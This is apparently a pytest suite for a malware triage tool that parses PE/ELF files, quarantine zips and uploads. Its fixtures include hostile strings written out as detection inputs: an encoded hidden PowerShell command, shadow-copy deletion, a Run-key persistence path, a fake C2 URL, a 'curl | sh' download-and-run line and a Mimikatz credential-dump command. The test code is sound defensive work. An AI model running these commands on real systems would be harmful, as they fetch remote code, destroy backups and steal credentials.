import io
import json
import struct
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
import zipfile

import pytest

from s1triage import sample
from s1triage.sample import SampleError, analyze_file, analyze_upload, parse_pe
from s1triage.web import build_server

pyzipper = pytest.importorskip("pyzipper")


def tiny_pe(extra: bytes = b"", section_name: bytes = b".text", entropy_blob: bytes = b"") -> bytes:
    """임포트 없는 최소 x64 PE (분석용, 실행 불가)."""
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3c, 64)
    coff = struct.pack("<4sHHIIIHH", b"PE\x00\x00", 0x8664, 1, 1_700_000_000, 0, 0, 240, 0x0022)
    opt = bytearray(240)
    struct.pack_into("<H", opt, 0, 0x20b)
    struct.pack_into("<I", opt, 16, 0x1000)          # entry
    struct.pack_into("<Q", opt, 24, 0x140000000)     # image base
    struct.pack_into("<HH", opt, 68, 3, 0x0140)      # console, ASLR+DEP
    struct.pack_into("<I", opt, 108, 16)             # NumberOfRvaAndSizes
    body = (entropy_blob or b"\x90" * 512) + extra
    raw_off = 0x200
    sec = struct.pack("<8sIIIIIIHHI", section_name.ljust(8, b"\x00"), len(body), 0x1000, len(body), raw_off,
                      0, 0, 0, 0, 0xE0000020)  # RWX
    hdr = bytes(dos) + coff + bytes(opt) + sec
    return hdr.ljust(raw_off, b"\x00") + body


def aes_zip(files, password=b"S1Infected!2026"):
    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(password)
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


def test_pe_structure_and_packer_findings():
    import os
    data = tiny_pe(section_name=b"UPX0", entropy_blob=os.urandom(8192))
    pe = parse_pe(data)
    assert pe["machine"] == "x64" and pe["bits"] == 64 and pe["kind"] == "EXE"
    assert pe["aslr"] and pe["dep"] and not pe["signed"]
    assert pe["sections"][0]["perms"] == "RWX" and pe["entry_section"] == "UPX0"
    names = {f["name"] for f in analyze_file("a.exe", data)["findings"]}
    assert {"패커 섹션", "쓰기+실행(RWX) 섹션", "높은 엔트로피 섹션(압축/암호화 의심)", "임포트가 매우 적음(패킹 의심)"} <= names


def test_elf_structure():
    data = open(sys.executable, "rb").read()
    r = analyze_file("python", data)
    assert r["type"] == "ELF"
    assert r["elf"]["machine"] in ("x86-64", "AArch64") and r["elf"]["sections"]


def test_strings_rules_and_iocs():
    text = (b"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n"
            b"vssadmin delete shadows /all /quiet\n"
            b"C:\\Users\\Public\\payload.exe http://evil-c2.xyz/gate.php 45.33.32.156\n"
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".encode("utf-16-le"))
    r = analyze_file("dropper.ps1", text)
    names = {f["name"] for f in r["findings"]}
    assert {"인코딩된 PowerShell", "백업/섀도 복사본 삭제", "자동 실행(지속성) 등록"} <= names
    assert "http://evil-c2.xyz/gate.php" in r["iocs"]["urls"]
    assert "45.33.32.156" in r["iocs"]["ips"] and "evil-c2.xyz" in r["iocs"]["domains"]
    assert r["score"] >= 8


def test_aes_quarantine_zip_in_memory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as zf:
        zf.writestr("stage2.sh", b"curl -s http://1.2.3.4/x | sh\n")
    z = aes_zip({"quarantine/evil.exe": tiny_pe(b"mimikatz sekurlsa::logonpasswords"), "nested.zip": inner.getvalue()})
    r = analyze_upload(z, "quarantine.zip", "S1Infected!2026")
    assert r["password_used"] and r["container"]["type"] == "ZIP"
    names = [f["name"] for f in r["files"]]
    assert "quarantine/evil.exe" in names and "nested.zip/stage2.sh" in names
    assert r["summary"]["verdict"] == sample.VERDICT_HIGH and r["summary"]["top_file"] == "quarantine/evil.exe"
    assert "Mimikatz" in r["report"]
    assert list(tmp_path.iterdir()) == []  # 디스크에 아무것도 풀지 않음


def test_zip_wrong_password_and_default_fallback():
    z = aes_zip({"a.txt": b"hello world"}, password=b"infected")
    assert analyze_upload(z, "q.zip", "wrong")["files"][0]["name"] == "a.txt"  # 기본 패스워드로 재시도
    z = aes_zip({"a.txt": b"hello world"}, password=b"secret")
    with pytest.raises(SampleError, match="패스워드"):
        analyze_upload(z, "q.zip", "wrong")


def test_zip_member_size_limit(monkeypatch):
    monkeypatch.setattr(sample, "MAX_MEMBER", 1000)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.bin", b"\x00" * 100_000)
        zf.writestr("ok.txt", b"fine")
    r = analyze_upload(buf.getvalue(), "b.zip")
    assert [f["name"] for f in r["files"]] == ["ok.txt"]
    assert any("bomb.bin" in w for w in r["warnings"])


@pytest.fixture
def server(tmp_path):
    srv = build_server(str(tmp_path), "127.0.0.1", 0, None)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}", tmp_path
    srv.shutdown()
    srv.server_close()


def upload(url, data, name, password="", headers=None):
    h = {"Content-Type": "application/octet-stream", "X-Filename": urllib.parse.quote(name),
         "X-Zip-Password": urllib.parse.quote(password), **(headers if headers is not None else {"X-S1Triage": "1"})}
    req = urllib.request.Request(url + "/api/sample?use_ti=1", data=data, method="POST", headers=h)
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())


def test_web_upload_saves_and_lists(server):
    url, tmp = server
    with pytest.raises(urllib.error.HTTPError) as exc:
        upload(url, b"x", "a.bin", headers={})
    assert exc.value.code == 403
    r = upload(url, aes_zip({"evil.exe": tiny_pe()}), "격리.zip", "S1Infected!2026")
    assert r["files"][0]["pe"]["machine"] == "x64"
    assert (tmp / f"sample_{r['id']}.json").is_file()
    with urllib.request.urlopen(url + "/api/samples") as resp:
        listing = json.loads(resp.read())
    assert listing["items"][0]["name"] == "격리.zip" and listing["default_password"]
    with urllib.request.urlopen(url + "/api/samples/" + r["id"]) as resp:
        assert json.loads(resp.read())["id"] == r["id"]
    with pytest.raises(urllib.error.HTTPError) as exc:
        upload(url, aes_zip({"a": b"x"}, b"nope"), "q.zip", "bad")
    assert exc.value.code == 400
